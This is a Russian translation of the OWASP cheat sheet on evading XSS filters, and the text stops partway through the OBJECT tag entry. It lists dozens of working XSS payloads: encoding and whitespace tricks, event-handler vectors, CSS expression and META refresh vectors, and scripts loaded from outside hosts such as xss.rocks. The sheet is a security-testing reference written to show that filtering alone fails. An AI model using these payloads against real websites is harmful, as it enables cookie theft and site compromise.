# Шпаргалка для обхода фильтров XSS

## Вступление

Эта статья представляет собой руководство по межсайтовому скриптовому тестированию (XSS) для специалистов по безопасности приложений. Эта шпаргалка изначально была основана на оригинальной XSS-шпаргалке Snake, опубликованной ранее на: `http://ha.ckers.org/xss.html`. Теперь серия OWASP Cheat Sheet предоставляет пользователям обновленную и поддерживаемую версию документа. Самая первая OWASP Cheat Sheet, [Предотвращение межсайтового скриптинга](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), была вдохновлена работой RSnake, и мы благодарим RSnake за вдохновение!

## Тесты

Эта шпаргалка демонстрирует, что фильтрация входных данных является неполной защитой для XSS, предоставляя тестировщикам серию XSS-атак, которые могут обойти определенные защитные фильтры XSS.

### Базовый тест XSS без обхода фильтра

Эта атака, использующая обычную XSS-инъекцию JavaScript, служит основой для шпаргалки (кавычки не требуются ни в одном современном браузере, поэтому здесь они опущены).:

```html
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
```

### Локатор XSS (полиглот)

Этот тест предоставляет "пейлоад XSS для полиглотского теста", которая выполняется в нескольких контекстах, включая HTML, строки скриптов, JavaScript и URL-адреса:

```js
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

(Основано на [tweet](https://twitter.com/garethheyes/status/997466212190781445) от [Gareth Heyes](https://twitter.com/garethheyes)).

### Неправильные "а" тэги

В этом тесте не используется атрибут `[href](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href)` , чтобы продемонстрировать атаку XSS с использованием обработчиков событий:

```js
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
```

Chrome автоматически вставит для вас пропущенные кавычки. Если у вас возникнут проблемы, попробуйте их опустить, и Chrome сам правильно расставит недостающие кавычки в URL-адресах или скриптах.:

```js
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```

(Submitted by David Cross, Verified on Chrome)

### Неправильные IMG тэги

Этот метод XSS использует упрощенный механизм рендеринга для создания вектора XSS в теге IMG (который должен быть заключен в кавычки). Мы считаем, что этот подход изначально предназначался для исправления небрежного кодирования, а также значительно усложнил бы корректный анализ HTML-тегов:

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

(Первоначально найдено пользователем Begeek, но было очищено и сокращено для работы во всех браузерах)

### fromCharCode

Если система не допускает каких-либо кавычек, вы можете выполнить `eval()` с методом `fromCharCode`  в JavaScript, чтобы создать нужный вам XSS-вектор:

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
```

### Тег SRC по умолчанию для прохождения фильтров, проверяющих домен SRC

Эта атака позволяет обойти большинство доменных фильтров SRC. Вставка JavaScript в обработчик событий также применима к любым типам HTML-тегов с использованием таких элементов, как Form, Iframe, Input, Embed и т.д. Это также позволяет заменять тип тега любым соответствующим событием, таким как `onblur` или `onclick, обеспечивая обширные вариации перечисленных здесь вводов:

```html
<IMG SRC=# onmouseover="alert('xxs')">
```

(Представлено Дэвидом Кроссом и отредактировано Абдуллой Хуссамом)

### Тег SRC по умолчанию, оставив его пустым

```html
<IMG SRC= onmouseover="alert('xxs')">
```

### Тег SRC по умолчанию, полностью исключив его

```html
<IMG onmouseover="alert('xxs')">
```

### При появлении предупреждения об ошибке

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

### Кодировка IMG onerror и предупреждений JavaScript

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

### Ссылки на десятичные версии символов HTML

Поскольку примеры XSS, в которых используется директива `javascript:` внутри тега `<IMG`, не работают в Firefox, этот подход использует десятичные ссылки на символы HTML в качестве обходного пути:

```html

 <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```

### Десятичные ссылки на HTML-символы без завершающих точек с запятой

Это часто эффективно для обхода XSS-фильтров, которые ищут строку `&\#XX;`, поскольку большинство людей не знают о дополнении, которое может содержать в общей сложности до 7 цифровых символов. Это также полезно для работы с фильтрами, которые декодируют строки типа `$tmp\_string =\~ s/.\*\\&\#(\\ d+);.\*/$1/;`, в которых неправильно предполагается, что точка с запятой требуется для завершения строки, закодированной в HTML (это встречается в обычном режиме).:

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
```

### Шестнадцатеричные ссылки на символы HTML без завершающих точек с запятой

Эта атака также применима к фильтру для строки `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;`,, поскольку предполагается, что после символа фунта следует числовой символ - , что неверно для шестнадцатеричных символов HTML:

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
```

### Встроенная табуляция

Такой подход разбивает атаку XSS:

<!-- markdownlint-disable MD010-->
```html
 <a href="jav	ascript:alert('XSS');">Click Me</a>
```
<!-- markdownlint-enable MD010-->

### Встроенная закодированная табуляция

Этот подход также может разбить атаку XSS:

```html
 <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
```

### Встроенная новая строка для разбиения XSS

Хотя некоторые защитники утверждают, что для этой атаки подойдет любой из символов 09-13 (десятичный), это неверно. Работают только 09 (горизонтальная табуляция), 10 (перевод строки) и 13 (возврат каретки). Ознакомьтесь с [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) для справки. Следующие четыре примера XSS-атак иллюстрируют этот вектор:

```html
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
```

#### Пример 1: Разбиение атаки XSS со встроенным возвратом каретки

(Примечание: с учетом вышеизложенного я делаю эти строки длиннее, чем они должны быть, потому что нули могут быть опущены. Часто я сталкивался с фильтрами, которые предполагают, что шестнадцатеричная и декодированная кодировки должны состоять из двух или трех символов. Реальное правило - 1-7 символов.):

```html
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```

#### Пример 2: Разделите директиву JavaScript с помощью Null

Нулевые символы также работают как XSS-векторы, но не так, как описано выше, вам нужно вводить их напрямую, используя что-то вроде Burp Proxy, или использовать `%00` в строке URL, или, если вы хотите написать свой собственный инструмент для ввода, вы можете использовать vim (`^V^@` выдаст значение null). или воспользуйтесь следующей программой, чтобы сгенерировать его в текстовый файл. Нулевой символ `%00` гораздо полезнее и помог мне обойти некоторые фильтры реального мира с помощью вариации этого примера:

```sh
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

#### Пример 3: Пробелы и метасимволы перед JavaScript в изображениях для XSS

Это полезно, если соответствие шаблону фильтра не учитывает пробелы в слове `javascript:`, что правильно, поскольку это не будет отображаться, но делает ложное предположение о том, что между кавычкой и ключевым словом `javascript:` не может быть пробела. На самом деле у вас может быть любой символ от 1 до 32 в десятичной системе счисления:

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```

#### Пример 4: Неалфавитный-нецифровой XSS

Синтаксический анализатор HTML в Firefox предполагает, что после ключевого слова HTML недопустима неалфавитная цифра, и поэтому рассматривает ее как пробел или недопустимый токен после HTML-тега. Проблема в том, что некоторые фильтры XSS предполагают, что тег, который они ищут, разделен пробелом. Например, `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`:

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```

Основываясь на той же идее, что и выше, я, однако, расширил ее, используя Snake's fuzzer. Механизм рендеринга Gecko допускает использование любых символов, кроме букв, цифр или символов инкапсуляции (например, кавычек, угловых скобок и т.д.), между обработчиком событий и знаком равенства, что упрощает обход блоков межсайтового скриптинга. Обратите внимание, что это также относится к символу серьезного ударения, как показано здесь:

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

Яир Амит отметил, что в движках рендеринга Trident (IE) и Gecko (Firefox) существует несколько иное поведение, которое позволяет использовать только косую черту между тегом и параметром без пробелов. Это может быть полезно при атаке, если система не допускает пробелов:

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```

### Посторонние открытые скобки

Этот XSS-вектор может обойти некоторые механизмы обнаружения, которые работают путем проверки совпадающих пар открытых и закрытых угловых скобок, а затем сравнения тега внутри, вместо более эффективного алгоритма, такого как [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm)  который ищет совпадения всей строки с открытой угловой скобкой и соответствующим тегом (после устранения путаницы, конечно). Двойная косая черта выделяет конечную внешнюю скобку, чтобы скрыть ошибку JavaScript:

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```

(Представлено Францем Седлмайером)

### Нет закрывающих тегов скрипта

В Firefox вам на самом деле не нужна часть `\></SCRIPT>` этого XSS-вектора, потому что Firefox предполагает, что закрывать HTML-тег безопасно, и добавляет закрывающие теги для вас. В отличие от следующей атаки, которая не затрагивает Firefox, этот метод не требует дополнительного HTML-кода под собой. При необходимости вы можете добавить кавычки, но обычно они не нужны:

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```

### Разрешение протокола в тегах скрипта

Этот конкретный вариант частично основан на обходе разрешения протокола Oz, описанном ниже, и работает в IE и Edge в режиме совместимости. Однако это особенно полезно, когда возникает проблема с пространством, и, конечно, чем короче ваш домен, тем лучше. `.j` является допустимым, независимо от типа кодировки, потому что браузер знает его в контексте тега SCRIPT:

```html
<SCRIPT SRC=//xss.rocks/.j>
```

(Представлено Łukasz Pilorz)

### Полуоткрытый HTML/JavaScript CSS вектор

В отличие от Firefox, движок рендеринга IE (Trident) не добавляет дополнительные данные на вашу страницу, но позволяет использовать директиву `javascript:` в изображениях. Это полезно в качестве вектора, поскольку для этого не требуется близкая угловая скобка. Это предполагает, что ниже есть какой-либо HTML-тег, в который вы вводите этот XSS-вектор. Даже если нет тега закрытия `\>`, теги под ним закроют его. Примечание: это приводит к путанице в HTML, в зависимости от того, какой HTML находится под ним. Это позволяет обойти следующее регулярное выражение системы обнаружения сетевых вторжений (NIDS): `/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/`потому что для этого не требуется конец `\>`. В качестве дополнительного примечания, это также было эффективно против реального фильтра XSS, использующего открытый тег `<IFRAME` вместо тега `<IMG`.

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```

### Обход экранирования JavaScript

Если приложение написано для вывода некоторой пользовательской информации внутри JavaScript (например, следующего: `<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`), и вы хотите внедрить в него свой собственный JavaScript, но серверное приложение пропускает определенные кавычки, вы можете обойти это, избежав их escape-символа. Когда это будет введено, он прочитает `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>`, что приведет к удалению двойных кавычек и запуску вектора XSS. Локатор XSS использует этот метод:

```js
\";alert('XSS');//
```

Альтернативный вариант, если к встроенным данным было применено правильное экранирование в формате JSON или JavaScript, но не в кодировке HTML, - это завершить блок сценария и запустить свой собственный:

```js
</script><script>alert('XSS');</script>
```

### Конечный тег заголовка

Это простой XSS-вектор, закрывающий теги `<TITLE>`, которые могут инкапсулировать вредоносную атаку с использованием межсайтовых сценариев:

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```

#### INPUT Атрибут
```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```

#### BODY Атрибут

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```

#### IMG Dynsrc 

```html
<IMG DYNSRC="javascript:alert('XSS')">
```

#### IMG Lowsrc

```html
<IMG LOWSRC="javascript:alert('XSS')">
```

### Список-стиль-изображение

Эта эзотерическая атака направлена на встраивание изображений в маркированные списки. Она будет работать только в движке рендеринга IE из-за директивы JavaScript. Не особенно полезный XSS-вектор:

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```

### VBScript в атрибуте

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```

### Тег объекта SVG

```js
<svg/onload=alert('XSS')>
```

### ECMAScript 6

```js
Set.constructor`alert\x28document.domain\x29
```

### Тэг BODY 

Эта атака не требует использования каких-либо вариантов `javascript:` или `<SCRIPT...` для выполнения XSS-атаки. Дэн Кроули отметил, что вы можете поставить пробел перед знаком равенства (`onload=` != `onload =`).:

```html
<BODY ONLOAD=alert('XSS')>
```

#### Атаки с использованием обработчиков событий

Атака с использованием тега BODY может быть модифицирована для использования в XSS-атаках, аналогичных описанной выше (на момент написания этой статьи это самый полный список в Сети). Спасибо Рене Левеску за обновления HTML+TIME.

В [веб-справочнике Dottoro](http://help.dottoro.com/) также есть хороший [список событий в JavaScript](http://help.dottoro.com/ljfvvdnm.php).

- `onAbort()` (когда пользователь прерывает загрузку изображения)
- `onActivate()` (когда объект установлен в качестве активного элемента)
- `onAfterPrint()` (activates after user prints or previews print job)
- `onAfterUpdate()` (активируется после того, как пользователь распечатает или предварительно просмотрит задание на печать)
- `onBeforeActivate()` (срабатывает до того, как объект будет установлен в качестве активного элемента)
- `onBeforeCopy()` (злоумышленник выполняет строку атаки непосредственно перед копированием выделенной области в буфер обмена - злоумышленники могут сделать это с помощью функции `execCommand("Копировать")`)
- `onBeforeCut()` (атакующий выполняет строку атаки непосредственно перед удалением выделения)
- `onBeforeDeactivate()` (срабатывает сразу после изменения activeElement с текущего объекта)
- `onBeforeEditFocus()` (срабатывает до того, как объект, содержащийся в редактируемом элементе, переходит в состояние, активируемое пользовательским интерфейсом, или когда выбран элемент управления редактируемым контейнером)
- `onBeforePaste()` (пользователя нужно заставить вставить файл обманом или принудительно, используя функцию `execCommand("Вставить")`)
- `OnBeforePrint()` (пользователя нужно было бы обманом заставить напечатать, или злоумышленник мог бы использовать функцию `print()` или `execCommand("Печать")`).
- `onBeforeUnload()` (пользователя нужно будет обманом заставить закрыть браузер - злоумышленник не сможет выгрузить окна, если они не были созданы из родительского браузера)
- `onBeforeUpdate()` (активируется в объекте данных перед обновлением данных в исходном объекте)
- `onBegin()` (событие onbegin запускается немедленно, когда начинается временная шкала элемента)
- `onBlur()` (в случае, когда загружается другое всплывающее окно и окно теряет фокус)
- `onBounce()` (срабатывает, когда свойство behavior объекта marquee имеет значение `alternate` и содержимое маркера достигает одной стороны окна)
- `onCellChange()` (срабатывает при изменении данных в поставщике данных)
- `onChange()` (поле select, text или TEXTAREA теряет фокус и его значение изменяется)
- `onClick()` (пользователь нажимает на форму)
- `onContextMenu()` (пользователю нужно будет щелкнуть правой кнопкой мыши на области атаки)
- `onControlSelect()` (срабатывает, когда пользователь собирается произвести контрольный выбор объекта)
- `onCopy()` (пользователю необходимо что-то скопировать, или это можно использовать с помощью команды `execCommand("Копировать")`)
- `onCut()` (пользователю необходимо что-то скопировать, или это можно использовать с помощью команды `execCommand("Вырезать")`)
- `onDataAvailable()` (пользователю потребуется изменить данные в элементе, или злоумышленник может выполнить ту же функцию)
- `onDataSetChanged()` (срабатывает, когда изменяется набор данных, предоставляемый объектом источника данных)
- `onDataSetComplete()` (срабатывает, чтобы указать, что все данные доступны из объекта источника данных)
- `onDblClick()` (пользователь дважды щелкает элемент формы или ссылку)
- `OnDeactivate()` (срабатывает, когда activeElement изменяется с текущего объекта на другой объект в родительском документе)
- `onDrag()` (требует, чтобы пользователь перетаскивал объект)
- `onDragEnd()` (требует, чтобы пользователь перетаскивал объект)
- `onDragLeave()` (требует, чтобы пользователь перетаскивал объект из допустимого местоположения)
- `onDragEnter()` (требует, чтобы пользователь перетащил объект в допустимое местоположение)
- `OnDragOver()` (требует, чтобы пользователь перетащил объект в допустимое местоположение)
- `OnDragDrop()` (пользователь помещает объект (например, файл) в окно браузера)
- `onDragStart()` (происходит, когда пользователь начинает операцию перетаскивания)
- `onDrop()` (пользователь помещает объект (например, файл) в окно браузера)
- `onEnd()` (событие onEnd запускается, когда заканчивается временная шкала.
- `onError()` (при загрузке документа или изображения возникает ошибка)
- `onErrorUpdate()` (срабатывает в привязанном к данным объекте при возникновении ошибки при обновлении связанных данных в объекте источника данных)
- `onFilterChange()` (срабатывает, когда визуальный фильтр завершает изменение состояния)
- `onFinish()` (злоумышленник может создать эксплойт, когда окно завершит цикл)
- `onFocus()` (злоумышленник выполняет строку атаки, когда окно получает фокус)
- `onFocusIn()` (атакующий выполняет строку атаки, когда окно получает фокус)
- `onFocusOut()` (атакующий выполняет строку атаки, когда окно теряет фокус)
- `onHashChange()` (срабатывает, когда часть идентификатора фрагмента текущего адреса документа изменяется)
- `onHelp()` (злоумышленник выполняет строку атаки, когда пользователь нажимает клавишу F1, когда окно находится в фокусе)
- `onInput()` (текстовое содержимое элемента изменяется через пользовательский интерфейс)
- `onKeyDown()` (пользователь нажимает клавишу)
- `onKeyPress()` (пользователь нажимает или удерживает нажатой клавишу)
- `onKeyUp()` (пользователь освобождает ключ)
- `onLayoutComplete()` (пользователю необходимо распечатать или предварительно просмотреть файл)
- `onLoad()` (злоумышленник выполняет строку атаки после загрузки окна)
- `onLoseCapture()` (может быть использован методом `ReleaseCapture()`)
- `onMediaComplete()` (При использовании потокового мультимедийного файла это событие может произойти до начала воспроизведения файла)
- `onMediaError()` (пользователь открывает в браузере страницу, содержащую медиафайл, и событие срабатывает при возникновении проблемы)
- `onMessage()` (срабатывает, когда документ получает сообщение)
- `OnMouseDown()` (злоумышленнику нужно будет заставить пользователя щелкнуть по изображению)
- `OnMouseEnter()` (курсор перемещается по объекту или области)
- `onMouseLeave()` (злоумышленнику нужно будет заставить пользователя навести курсор мыши на изображение или таблицу, а затем снова отключить)
- `OnMouseMove()` (злоумышленнику нужно будет заставить пользователя навести курсор мыши на изображение или таблицу)
- `onMouseOut()` (злоумышленнику нужно будет заставить пользователя навести курсор мыши на изображение или таблицу, а затем снова отключить)
- `onMouseOver()` (курсор перемещается по объекту или области)
- `OnMouseUp()` (злоумышленнику нужно будет заставить пользователя щелкнуть по изображению)
- `onMouseWheel()` (злоумышленнику нужно будет заставить пользователя использовать колесико мыши)
- `onMove()` (пользователь или злоумышленник переместит страницу)
- `onMoveEnd()` (пользователь или злоумышленник переместит страницу)
- `onMoveStart()` (пользователь или злоумышленник переместит страницу)
- `onOffline()` (запускается, если браузер работает в режиме онлайн и начинает работать в автономном режиме)
- `onOnline()` (запускается, если браузер работает в автономном режиме и начинает работать в режиме онлайн)
- `onOutOfSync()` (прерывает воспроизведение мультимедиа элемента в соответствии с временной шкалой)
- `onPaste()` (пользователю потребуется вставить, или злоумышленник может использовать функцию `execCommand("Вставить")`)
- `onPause()` (событие onpause срабатывает для каждого активного элемента, когда временная шкала приостанавливается, включая элемент body)
- `onPopState()` (срабатывает, когда пользователь просматривает историю сеансов)
- `onPropertyChange()` (пользователю или злоумышленнику потребуется изменить свойство элемента)
- `onReadyStateChange()` (пользователю или злоумышленнику потребуется изменить свойство элемента)
- `onRedo()` (пользователь перешел в журнал отмены транзакций)
- `onRepeat()` (событие срабатывает один раз при каждом повторении временной шкалы, исключая первый полный цикл)
- `onReset()` (пользователь или злоумышленник сбрасывает форму)
- `OnResize()` (пользователь изменит размер окна; злоумышленник может автоматически инициализировать его с помощью чего-то вроде: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResizeEnd()` (пользователь изменит размер окна; злоумышленник может автоматически инициализировать его с помощью чего-то вроде: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResizeStart()` (пользователь изменит размер окна; злоумышленник может автоматически инициализировать его с помощью чего-то вроде: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
- `onResume()` (событие onresume срабатывает для каждого элемента, который становится активным при возобновлении временной шкалы, включая элемент body).
- `onReverse()` (если элемент имеет значение repeatCount больше единицы, это событие срабатывает каждый раз, когда временная шкала начинает воспроизводиться в обратном порядке)
- `onRowsEnter()` (пользователю или злоумышленнику потребуется изменить строку в источнике данных)
- `onRowExit()` (пользователю или злоумышленнику потребуется изменить строку в источнике данных)
- `onRowDelete()` (пользователю или злоумышленнику потребуется удалить строку в источнике данных)
- `onRowInserted()` (пользователю или злоумышленнику потребуется вставить строку в источник данных)
- `onScroll()` (пользователю потребуется выполнить прокрутку, или злоумышленник может использовать функцию `scrollBy()`)
- `onSeek()` (событие "onReverse" срабатывает, когда временная шкала настроена на воспроизведение в любом направлении, кроме прямого)
- `onSelect()` (пользователю необходимо выбрать какой-либо текст - злоумышленник может автоматически инициализировать его с помощью чего-то вроде: `window.document.execCommand("selectAll");`)
- `onSelectionChange()` (пользователю необходимо выбрать какой-либо текст - злоумышленник может автоматически инициализировать его с помощью чего-то вроде: `window.document.execCommand("selectAll");`)
- `onSelectStart()` (пользователю необходимо выбрать какой-либо текст - злоумышленник может автоматически инициализировать его с помощью чего-то вроде: `window.document.execCommand("selectAll");`)
- `OnStart()` (запускается в начале каждого цикла выделения)
- `onStop()` (пользователю необходимо нажать кнопку `Стоп` или покинуть веб-страницу)
- `onStorage()` (изменена область хранения)
- `onSyncRestored()` (пользователь прерывает воспроизведение мультимедиа элемента в соответствии с временной шкалой для запуска)
- `onSubmit()` (требуется, чтобы злоумышленник или пользователь отправил форму)
- `onTimeError()` (пользователь или злоумышленник присваивает свойству time, такому как dur, недопустимое значение)
- `onTrackChange()` (пользователь или злоумышленник изменяет трек в списке воспроизведения)
- `onUndo()` (пользователь вернулся назад в истории отмены транзакций)
- `onUnload()` (когда пользователь нажимает на любую ссылку, или нажимает кнопку "Назад", или злоумышленник нажимает принудительно)
- `onURLFlip()` (это событие срабатывает, когда файл расширенного потокового формата (ASF), воспроизводимый с помощью мультимедийного тега HTML+TIME (Timed Interactive Multimedia Extensions), обрабатывает команды сценария, встроенные в ASF-файл).
- `seekSegmentTime()` (это метод, который определяет местоположение указанной точки на временной шкале сегмента элемента и начинает воспроизведение с этой точки. Сегмент состоит из одного повторения временной шкалы, включая воспроизведение в обратном порядке с использованием атрибута AUTOREVERSE.)

#### BGSOUND

```js
<BGSOUND SRC="javascript:alert('XSS');">
```

#### Включение & в JavaScript 

```html
<BR SIZE="&{alert('XSS')}">
```

#### Таблица стилей

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```

### Внешняя таблица стилей

Используя такую простую вещь, как удаленная таблица стилей, вы можете включить свой XSS, поскольку параметр style можно переопределить с помощью встроенного выражения. Это работает только в IE. Обратите внимание, что на странице нет ничего, что указывало бы на наличие встроенного JavaScript. Примечание: Во всех этих примерах удаленных таблиц стилей используется тег body, поэтому он не будет работать, если на странице нет какого-либо содержимого, отличного от самого вектора, поэтому вам нужно добавить одну букву на страницу, чтобы заставить его работать, если это пустая страница:

```html
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```

#### Внешняя таблица стилей, часть 2

Это работает так же, как описано выше, но использует тег `<STYLE>` вместо тега `<LINK>`). Небольшое изменение этого вектора было использовано для взлома Google Desktop. В качестве дополнительного замечания, вы можете удалить конечный тег `</STYLE>`, если сразу после вектора есть HTML, чтобы закрыть его. Это полезно, если вы не можете использовать знак равенства или косую черту в своей межсайтовой скриптовой атаке, которая хотя бы раз применялась в реальном мире:

```html
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```

#### Внешняя таблица стилей, часть 3

Это работает только в движках рендеринга Gecko и работает путем привязки файла XUL к родительской странице.

```html
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```

### Теги STYLE, которые разбивают JavaScript на части для XSS

Этот XSS время от времени отправляет IE в бесконечный цикл предупреждений:

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```

### Атрибут STYLE, который разбивает выражение на части

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```

(Автор Roman Ivanov)

### IMG STYLE с выражениями

На самом деле это гибрид двух последних XSS-векторов, но он действительно показывает, насколько сложным может быть разбор тегов стиля по отдельности. Это может привести к тому, что IE зациклится:

```html
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```

### Тэг STYLE с использованием фонового изображения

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```

### Тэг STYLE с использованием фона

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```

### Анонимный HTML-код с атрибутом STYLE

Механизму рендеринга IE на самом деле все равно, существует созданный вами HTML-тег или нет, если он начинается с открытой угловой скобки и буквы:

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```

### Локальный файл htc

Этот файл немного отличается от двух предыдущих XSS-векторов, поскольку в нем используется файл .htc, который должен находиться на том же сервере, что и XSS-вектор. Этот пример файла работает, используя JavaScript и запуская его как часть атрибута style:

```html
<XSS STYLE="behavior: url(xss.htc);">
```

### Кодировка US-ASCII

В этой атаке используется искаженная кодировка ASCII с 7 битами вместо 8. Этот метод XSS может обойти многие фильтры содержимого, но он работает только в том случае, если хост передает данные в кодировке US-ASCII или если вы сами установили кодировку. Это более полезно для защиты от XSS-обхода брандмауэра веб-приложений (WAF), чем от фильтрации на стороне сервера. Apache Tomcat - единственный известный сервер, который по умолчанию все еще передает данные в кодировке US-ASCII.

```js
¼script¾alert(¢XSS¢)¼/script¾
```

### META

Особенность meta refresh в том, что он не отправляет ссылку в заголовке, поэтому его можно использовать для определенных типов атак, когда вам нужно избавиться от ссылающихся URL-адресов:

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```

#### META с использованием данных

Схема URL-адресов с директивами. Этот метод атаки хорош тем, что в нем также нет ничего видимого, что содержало бы слово SCRIPT или директиву JavaScript, поскольку он использует кодировку base64.  Пожалуйста, посмотрите  [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) для получения более подробной информации.

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```

#### META с дополнительным параметром URL

Если целевой веб-сайт попытается проверить, содержит ли URL-адрес `<http://>;` в начале, вы можете обойти это правило фильтрации следующим способом:

```html
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
```

(Автор Moritz Naumann)

### IFRAME

Если IFRAME разрешены, то возникает множество других проблем с XSS:

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```

### IFRAME Основанный на событиях

Фреймы и большинство других элементов могут использовать событийный хаос, подобный приведенному ниже:

```html
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```

(Автор: David Cross)

### FRAME

Фреймы имеют те же проблемы с XSS, что и iFrames

```html
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```

### TABLE

```html
<TABLE BACKGROUND="javascript:alert('XSS')">
```

#### TD

Как и выше, TD уязвимы для фонов, содержащих XSS-векторы JavaScript:

```html
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```

### DIV

#### DIV Background-image

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

#### DIV Background-image с помощью эксплойта Unicode XSS

Это было немного изменено, чтобы запутать параметр URL:

```html
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```

(Первоначальная уязвимость была обнаружена Рено Лифшицем как уязвимость в Hotmail)

#### DIV Background-image Plus Extra Characters

RSnake встроил быстрый XSS-фаззер для обнаружения любых ошибочных символов, которые допускаются после открытых круглых скобок, но перед директивой JavaScript в IE. Они указаны в десятичном формате, но вы, конечно, можете включить шестнадцатеричный и добавить отступы. (Можно использовать любой из следующих символов: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

#### DIV Выражения

Вариант этой атаки был эффективен против реального XSS-фильтра с использованием новой строки между двоеточием и `expression`:

```html
<DIV STYLE="width: expression(alert('XSS'));">
```

### Нижний уровень - Скрытый блок

Работает только на движке рендеринга IE - Trident. Некоторые веб-сайты считают, что все, что находится внутри блока комментариев, безопасно и поэтому не нуждается в удалении, что позволяет нашему XSS-вектору существовать. Или система может попытаться добавить теги комментариев к чему-либо в тщетной попытке обезопасить это. Как мы видим, это, вероятно, не сработает:

```js
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```

### Тэг BASE 

Работает в IE в безопасном режиме) Для этой атаки требуется `//`, чтобы закомментировать следующие символы, чтобы вы не получили ошибку JavaScript и ваш тег XSS отображался. Кроме того, это связано с тем, что многие веб-сайты используют динамически размещаемые изображения, такие как `images/image.jpg`, а не полные пути. Если путь содержит начальную косую черту, такую как `images/image.jpg`, вы можете удалить одну косую черту из этого вектора (если в начале комментария их две, это сработает):

```html
<BASE HREF="javascript:alert('XSS');//">
```

### Тэг OBJECT

Если система разрешает использование объектов, вы также можете внедрить полезные вирусы, которые могут заразить пользователей и т.д., с помощью тега APPLET. Связанный файл на самом деле является HTML-файлом, который может содержать ваш XSS:

```html
